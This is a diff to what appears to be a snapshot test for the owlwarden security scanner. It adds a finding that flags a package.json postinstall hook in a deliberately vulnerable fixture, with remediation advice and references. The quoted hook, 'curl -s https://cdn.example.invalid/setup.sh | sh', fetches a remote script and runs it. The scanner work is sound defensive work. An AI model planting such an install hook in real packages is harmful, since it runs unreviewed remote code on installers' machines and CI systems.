@@ -19,7 +19,7 @@ expression: encoded
   },
   "summary": {
     "high": 10,
-    "medium": 10,
+    "medium": 11,
     "low": 0,
     "info": 0
   },
@@ -1127,6 +1127,72 @@ expression: encoded
       ]
     },
     {
+      "id": "install-lifecycle-script",
+      "severity": "medium",
+      "confidence": "likely",
+      "owasp": "A08:2021",
+      "asi": "ASI04",
+      "cwe": 829,
+      "title": "Package declares an install-time script",
+      "why": "`postinstall` runs for everyone who installs this package, before any code is reviewed and often inside CI with credentials in the environment. This is the mechanism a compromised package uses to spread.",
+      "location": {
+        "path": "package.json",
+        "line": 7,
+        "col": 5
+      },
+      "snippet": {
+        "path": "package.json",
+        "startLine": 5,
+        "lines": [
+          "  \"description\": \"Deliberately vulnerable Next.js App Router fixture. Never deploy this.\",",
+          "  \"scripts\": {",
+          "    \"postinstall\": \"curl -s https://cdn.example.invalid/setup.sh | sh\"",
+          "  },",
+          "  \"dependencies\": {"
+        ],
+        "highlight": {
+          "line": 7,
+          "startCol": 20,
+          "endCol": 71,
+          "label": "runs automatically on install (postinstall)"
+        }
+      },
+      "context": {
+        "framework": "next",
+        "evidence": "curl -s https://cdn.example.invalid/setup.sh | sh"
+      },
+      "remediation": [
+        {
+          "framework": "next",
+          "summary": "Move the work into an explicit script the developer runs (`pnpm setup`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve.",
+          "patch": "// package.json\n\"scripts\": { \"prepare\": \"next build\" }\n// and: pnpm config set ignore-scripts true",
+          "safety": "manual"
+        },
+        {
+          "summary": "Move the work into an explicit script the developer runs (`pnpm setup`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve.",
+          "patch": "\"scripts\": { \"setup\": \"node scripts/setup.mjs\" }  // not postinstall",
+          "safety": "manual"
+        }
+      ],
+      "references": [
+        {
+          "kind": "owasp",
+          "id": "A08:2021",
+          "url": "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+        },
+        {
+          "kind": "cwe",
+          "id": "CWE-829",
+          "url": "https://cwe.mitre.org/data/definitions/829.html"
+        },
+        {
+          "kind": "docs",
+          "id": "RULES.md#install-lifecycle-script",
+          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#install-lifecycle-script"
+        }
+      ]
+    },
+    {
       "id": "unpinned-dependency",
       "severity": "medium",
       "confidence": "likely",
@@ -1136,7 +1202,7 @@ expression: encoded
       "why": "An unpinned range lets the next install resolve a different major version, including one with a known vulnerability or a breaking API change, without anyone reviewing the bump.",
       "location": {
         "path": "package.json",
-        "line": 11,
+        "line": 14,
         "col": 1
       },
       "context": {
